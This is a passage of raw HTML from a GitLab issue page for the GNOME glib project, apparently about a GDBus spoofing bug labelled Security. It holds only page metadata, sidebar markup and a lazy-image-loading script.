spoofing&quot;,&quot;time_estimate&quot;:0,&quot;total_time_spent&quot;:0,&quot;human_time_estimate&quot;:null,&quot;human_total_time_spent&quot;:null,&quot;state&quot;:&quot;closed&quot;,&quot;milestone_id&quot;:1948,&quot;updated_by_id&quot;:1115,&quot;created_at&quot;:&quot;2024-02-24T15:43:04Z&quot;,&quot;updated_at&quot;:&quot;2024-09-12T22:33:07Z&quot;,&quot;milestone&quot;:{&quot;id&quot;:1948,&quot;iid&quot;:136,&quot;project_id&quot;:658,&quot;title&quot;:&quot;2.82.0&quot;,&quot;description&quot;:&quot;&quot;,&quot;state&quot;:&quot;closed&quot;,&quot;created_at&quot;:&quot;2024-02-09T09:14:17.497Z&quot;,&quot;updated_at&quot;:&quot;2024-08-26T09:40:42.463Z&quot;,&quot;due_date&quot;:&quot;2024-08-22&quot;,&quot;start_date&quot;:null,&quot;expired&quot;:true,&quot;web_url&quot;:&quot;https://gitlab.gnome.org/GNOME/glib/-/milestones/136&quot;},&quot;labels&quot;:[{&quot;id&quot;:339,&quot;title&quot;:&quot;1. Bug&quot;,&quot;color&quot;:&quot;#ccc063&quot;,&quot;description&quot;:&quot;Problems, incorrect behavior or appearance&quot;,&quot;text_color&quot;:&quot;#1F1E24&quot;,&quot;created_at&quot;:&quot;2017-10-18T13:52:56.817Z&quot;,&quot;updated_at&quot;:&quot;2018-11-22T19:52:55.180Z&quot;,&quot;group_id&quot;:8,&quot;project_id&quot;:null,&quot;template&quot;:false},{&quot;id&quot;:330,&quot;title&quot;:&quot;1. Security&quot;,&quot;color&quot;:&quot;#ccc063&quot;,&quot;description&quot;:&quot;Security, privacy or safety issues&quot;,&quot;text_color&quot;:&quot;#1F1E24&quot;,&quot;created_at&quot;:&quot;2017-10-18T10:15:04.167Z&quot;,&quot;updated_at&quot;:&quot;2017-10-18T16:35:03.428Z&quot;,&quot;group_id&quot;:8,&quot;project_id&quot;:null,&quot;template&quot;:false},{&quot;id&quot;:3722,&quot;title&quot;:&quot;GDBus&quot;,&quot;color&quot;:&quot;#428BCA&quot;,&quot;description&quot;:&quot;&quot;,&quot;text_color&quot;:&quot;#FFFFFF&quot;,&quot;created_at&quot;:&quot;2018-05-24T12:30:50.985Z&quot;,&quot;updated_at&quot;:&quot;2018-05-24T22:11:22.429Z&quot;,&quot;group_id&quot;:null,&quot;project_id&quot;:658,&quot;template&quot;:false}],&quot;lock_version&quot;:10,&quot;author_id&quot;:8744,&quot;confidential&quot;:false,&quot;discussion_locked&quot;:null,&quot;assignees&quot;:[{&quot;id&quot;:421,&quot;username&quot;:&quot;pwithnall&quot;,&quot;name&quot;:&quot;Philip Withnall&quot;,&quot;state&quot;:&quot;active&quot;,&quot;locked&quot;:false,&quot;avatar_url&quot;:&quot;https://secure.gravatar.com/avatar/64accaf7aa44dfa9d1a438a70d0fbaf9d55bf71314b14025ebbd62457219fbec?s=80\u0026d=identicon&quot;,&quot;web_url&quot;:&quot;https://gitlab.gnome.org/pwithnall&quot;}],&quot;due_date&quot;:&quot;2024-05-07&quot;,&quot;project_id&quot;:658,&quot;moved_to_id&quot;:null,&quot;duplicated_to_id&quot;:null,&quot;web_url&quot;:&quot;/GNOME/glib/-/issues/3268&quot;,&quot;current_user&quot;:{&quot;can_create_note&quot;:false,&quot;can_create_confidential_note&quot;:false,&quot;can_update&quot;:false,&quot;can_set_issue_metadata&quot;:false,&quot;can_award_emoji&quot;:false},&quot;create_note_path&quot;:&quot;/GNOME/glib/notes?target_id=195110\u0026target_type=issue&quot;,&quot;preview_note_path&quot;:&quot;/GNOME/glib/-/preview_markdown?target_id=3268\u0026target_type=Issue&quot;,&quot;is_project_archived&quot;:false,&quot;issue_email_participants&quot;:[],&quot;type&quot;:&quot;ISSUE&quot;}" data-noteable-type="Issue" data-notes-data="{&quot;noteableType&quot;:&quot;issue&quot;,&quot;noteableId&quot;:195110,&quot;projectId&quot;:658,&quot;groupId&quot;:null,&quot;discussionsPath&quot;:&quot;/GNOME/glib/-/issues/3268/discussions.json&quot;,&quot;registerPath&quot;:&quot;/users/sign_up?redirect_to_referer=yes&quot;,&quot;newSessionPath&quot;:&quot;/users/sign_in?redirect_to_referer=yes&quot;,&quot;markdownDocsPath&quot;:&quot;/help/user/markdown.md&quot;,&quot;quickActionsDocsPath&quot;:&quot;/help/user/project/quick_actions.md&quot;,&quot;closePath&quot;:&quot;/GNOME/glib/-/issues/3268.json?issue%5Bstate_event%5D=close&quot;,&quot;reopenPath&quot;:&quot;/GNOME/glib/-/issues/3268.json?issue%5Bstate_event%5D=reopen&quot;,&quot;notesPath&quot;:&quot;/GNOME/glib/noteable/issue/195110/notes&quot;,&quot;prerenderedNotesCount&quot;:10,&quot;lastFetchedAt&quot;:1736623789000000,&quot;notesFilter&quot;:null}" data-notes-filters="{&quot;Show all activity&quot;:0,&quot;Show comments only&quot;:1,&quot;Show history only&quot;:2}" data-report-abuse-path="/-/abuse_reports/add_category" data-show-timeline-view-toggle="false" data-target-type="issue" id="js-vue-notes"></div>
</section>

</div>
</div>
<aside aria-label="issue" aria-live="polite" class="right-sidebar js-right-sidebar js-issuable-sidebar right-sidebar-expanded" data-always-show-toggle data-auto-collapse data-issuable-type="issue">
<div class="issuable-sidebar">
<div class="issuable-sidebar-header">
<button class="gl-button btn btn-md btn-default gutter-toggle gl-float-right js-sidebar-toggle has-tooltip !gl-shadow-none gl-block " type="button" aria-label="Toggle sidebar" title="Collapse sidebar" data-container="body" data-placement="left" data-boundary="viewport" type="button"><span class="gl-button-text">
<span class="js-sidebar-toggle-container gl-button-text" data-is-expanded="true"><svg class="s16 js-sidebar-expand hidden" data-testid="chevron-double-lg-left-icon"><use href="/assets/icons-8791a66659d025e0a4c801978c79a1fbd82db1d27d85f044a35728ea7cf0ae80.svg#chevron-double-lg-left"></use></svg><svg class="s16 js-sidebar-collapse " data-testid="chevron-double-lg-right-icon"><use href="/assets/icons-8791a66659d025e0a4c801978c79a1fbd82db1d27d85f044a35728ea7cf0ae80.svg#chevron-double-lg-right"></use></svg></span>

</span>

</button></div>
<form class="issuable-context-form inline-update js-issuable-update " action="/GNOME/glib/-/issues/3268.json" accept-charset="UTF-8" data-remote="true" method="post"><div class="block assignee gl-mt-3" data-testid="assignee-block-container">
<div class="js-sidebar-assignees-root" data-field="issue" data-max-assignees="1">
<div class="title hide-collapsed gl-flex gl-justify-between gl-items-center !gl-mb-0">
<span class="gl-font-bold">Assignee</span>
<span class="gl-spinner-container" role="status"><span aria-hidden class="gl-spinner gl-spinner-sm gl-spinner-dark !gl-align-text-bottom"></span><span class="gl-sr-only !gl-absolute">Loading</span>
</span>
</div>
</div>

</div>

<div class="js-sidebar-labels-widget-root" data-allow-label-create="" data-allow-scoped-labels="" data-can-edit="" data-iid="3268" data-issuable-type="issue" data-labels-fetch-path="/GNOME/glib/-/labels.json?include_ancestor_groups=true" data-labels-manage-path="/GNOME/glib/-/labels" data-project-issues-path="/GNOME/glib/-/issues" data-project-path="GNOME/glib" data-selected-labels="[{&quot;id&quot;:339,&quot;title&quot;:&quot;1. Bug&quot;,&quot;color&quot;:&quot;#ccc063&quot;,&quot;description&quot;:&quot;Problems, incorrect behavior or appearance&quot;,&quot;text_color&quot;:&quot;#1F1E24&quot;,&quot;created_at&quot;:&quot;2017-10-18T13:52:56.817Z&quot;,&quot;updated_at&quot;:&quot;2018-11-22T19:52:55.180Z&quot;,&quot;group_id&quot;:8,&quot;project_id&quot;:null,&quot;template&quot;:false},{&quot;id&quot;:330,&quot;title&quot;:&quot;1. Security&quot;,&quot;color&quot;:&quot;#ccc063&quot;,&quot;description&quot;:&quot;Security, privacy or safety issues&quot;,&quot;text_color&quot;:&quot;#1F1E24&quot;,&quot;created_at&quot;:&quot;2017-10-18T10:15:04.167Z&quot;,&quot;updated_at&quot;:&quot;2017-10-18T16:35:03.428Z&quot;,&quot;group_id&quot;:8,&quot;project_id&quot;:null,&quot;template&quot;:false},{&quot;id&quot;:3722,&quot;title&quot;:&quot;GDBus&quot;,&quot;color&quot;:&quot;#428BCA&quot;,&quot;description&quot;:&quot;&quot;,&quot;text_color&quot;:&quot;#FFFFFF&quot;,&quot;created_at&quot;:&quot;2018-05-24T12:30:50.985Z&quot;,&quot;updated_at&quot;:&quot;2018-05-24T22:11:22.429Z&quot;,&quot;group_id&quot;:null,&quot;project_id&quot;:658,&quot;template&quot;:false}]"></div>
<div class="block milestone" data-testid="sidebar-milestones">
<div class="js-sidebar-milestone-widget-root" data-can-edit="" data-issue-iid="3268" data-project-path="GNOME/glib"></div>
</div>

<div class="js-sidebar-due-date-widget-root"></div>
<div class="js-sidebar-time-tracking-root block">
<!-- / Fallback while content is loading -->
<div class="title hide-collapsed gl-flex gl-justify-between gl-items-center !gl-mb-0">
<span class="gl-font-bold">Time tracking</span>
<span class="gl-spinner-container" role="status"><span aria-hidden class="gl-spinner gl-spinner-sm gl-spinner-dark !gl-align-text-bottom"></span><span class="gl-sr-only !gl-absolute">Loading</span>
</span>
</div>
</div>
<script id="js-confidential-issue-data" type="application/json">{"is_confidential":false,"is_editable":null}</script>
<div class="js-sidebar-confidential-widget-root"></div>

<div class="js-sidebar-participants-widget-root"></div>
</form><script class="js-sidebar-options" type="application/json">{"endpoint":"/GNOME/glib/-/issues/3268.json?serializer=sidebar_extras","toggleSubscriptionEndpoint":"/GNOME/glib/-/issues/3268/toggle_subscription","moveIssueEndpoint":"/GNOME/glib/-/issues/3268/move","projectsAutocompleteEndpoint":"/-/autocomplete/projects?project_id=658","editable":"","currentUser":{},"rootPath":"/","fullPath":"GNOME/glib","iid":3268,"id":195110,"severity":"unknown","timeTrackingLimitToHours":false,"canCreateTimelogs":null,"createNoteEmail":null,"issuableType":"issue","directlyInviteMembers":"false"}</script>
</div>
</aside>



</main>
</div>


</div>
</div>


<script>
//<![CDATA[
if ('loading' in HTMLImageElement.prototype) {
  document.querySelectorAll('img.lazy').forEach(img => {
    img.loading = 'lazy';
    let imgUrl = img.dataset.src;
    // Only adding width + height for avatars for now
    if (imgUrl.indexOf('/avatar/') > -1 && imgUrl.indexOf('?') === -1) {
      const targetWidth = img.getAttribute('width') || img.width;
      imgUrl += `?width=${targetWidth}`;
    }
    img.src = imgUrl;
    img.removeAttribute('data-src');
    img.classList.remove('lazy');
    img.classList.add('js-lazy-loaded');
    img.dataset.testid = 'js-lazy-loaded-content';
  });
}

//]]>
</script>
<script>
//<![CDATA[
gl = window.gl || {};
gl.experiments = {};


//]]>
</script>

</body>
</html>

